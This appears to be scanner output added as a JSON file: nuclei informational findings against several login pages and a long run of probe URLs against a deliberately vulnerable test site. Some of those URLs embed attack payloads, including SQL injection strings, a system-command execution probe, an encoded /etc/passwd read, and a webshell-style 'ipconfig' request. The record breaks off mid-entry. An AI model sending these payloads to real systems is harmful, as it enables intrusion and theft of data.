@@ -1,0 +1,3590 @@
+{
+    "headers": {
+        "Server": "nginx/1.19.0",
+        "Date": "Tue, 06 Jan 2026 13:39:43 GMT",
+        "Content-Type": "text/html; charset=UTF-8",
+        "Transfer-Encoding": "chunked",
+        "Connection": "keep-alive",
+        "X-Powered-By": "PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+        "Content-Encoding": "gzip"
+    },
+    "webtechnologies": [
+        {
+            "name": "nginx",
+            "version": "1.19.0",
+            "source": "HTTP-Header"
+        },
+        {
+            "name": "PHP",
+            "version": "5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+            "source": "HTTP-Header"
+        }
+    ],
+    "nuclei_vulns": [
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://codepen.io/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://codepen.io/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://codepen.io/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://codepen.io/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://codepen.io/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://codepen.io/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://identity.getpostman.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://identity.getpostman.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://identity.getpostman.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://identity.getpostman.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://identity.getpostman.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "https://codepen.io/login",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "https://identity.getpostman.com/login",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (Rules)",
+            "severity": "info",
+            "url": "https://github.com/login",
+            "template_id": "secrets-patterns-rules",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic",
+                "vuln"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "https://app.datadoghq.com/account/login",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://identity.atechmedia.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://identity.atechmedia.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://identity.atechmedia.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://identity.atechmedia.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://identity.atechmedia.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Secrets Patterns (PII)",
+            "severity": "info",
+            "url": "https://identity.atechmedia.com/login",
+            "template_id": "secrets-patterns-pii",
+            "tags": [
+                "global-matchers",
+                "exposure",
+                "token",
+                "key",
+                "api",
+                "secret",
+                "password",
+                "generic"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/index.php?p=valid&p=valid&pp=12&pp=12&s=/home/page/uploadImg",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/index.php?pp=12&pp=12&s=/home/page/uploadImg",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/seeyon/htmlofficeservlet?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/seeyon/htmlofficeservlet?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/bsh.servlet.BshServlet?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/s=set&_method=__construct&method=*&filter[]=system?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/WEB_VMS/LEVEL15/?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/seeyon/test123456.jsp?p=valid&p=valid&pp=12&pp=12&pwd=asasd3344&37szwIxfA1CEocxWVkU2fxUZ4co=ipconfig",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/seeyon/test123456.jsp?pp=12&pp=12&pwd=asasd3344&37szwIxfA1CEocxWVkU2fxUZ4co=ipconfig",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/WEB_VMS/LEVEL15/?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/s=set&_method=__construct&method=*&filter[]=system?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/public/index.php?pp=12&pp=12&s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/public/index.php?p=valid&p=valid&pp=12&pp=12&s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/servlet/~ic/bsh.servlet.BshServlet?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/sys/ui/extend/varkind/custom.jsp?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/servlet/~ic/bsh.servlet.BshServlet?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/servlet/~ic/bsh.servlet.BshServlet?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/servlet/~ic/bsh.servlet.BshServlet?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/webadm/?p=valid&p=valid&pp=12&pp=12&q=moni_detail.do&action=gragh",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/general/index/UploadFile.php?pp=12&pp=12&m=uploadPicture&uploadType=eoffice_logo&userId",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/general/index/UploadFile.php?p=valid&p=valid&pp=12&pp=12&m=uploadPicture&uploadType=eoffice_logo&userId",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/images/logo/logo-eoffice.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/images/logo/logo-eoffice.php?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/sys/ui/extend/varkind/custom.jsp?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/zentao/user-login.html?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/zentao/user-login.html?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/servlet/codesettree?p=valid&p=valid&pp=12&pp=12&flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/servlet/codesettree?pp=12&pp=12&flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/mobile/plugin/browser.jsp?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/mobile/plugin/browser.jsp?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/uapjs/jsinvoke/?pp=12&pp=12&action=invoke",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/uapjs/jsinvoke/?p=valid&p=valid&pp=12&pp=12&action=invoke",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/IEc2z3cBL7gb.jsp?pp=12&pp=12&error=bsh.Interpreter",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/IEc2z3cBL7gb.jsp?p=valid&p=valid&pp=12&pp=12&error=bsh.Interpreter",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/dataSetParam/verification;swagger-ui/?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/dataSetParam/verification;swagger-ui/?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/service/~iufo/com.ufida.web.action.ActionServlet?pp=12&pp=12&action=nc.ui.iufo.release.ReleaseRepMngAction&method=updateDelFlag&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:6%27--",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/service/~iufo/com.ufida.web.action.ActionServlet?p=valid&p=valid&pp=12&pp=12&action=nc.ui.iufo.release.ReleaseRepMngAction&method=updateDelFlag&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:6%27--",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/index.php/User/doLogin?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/index.php/User/doLogin?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
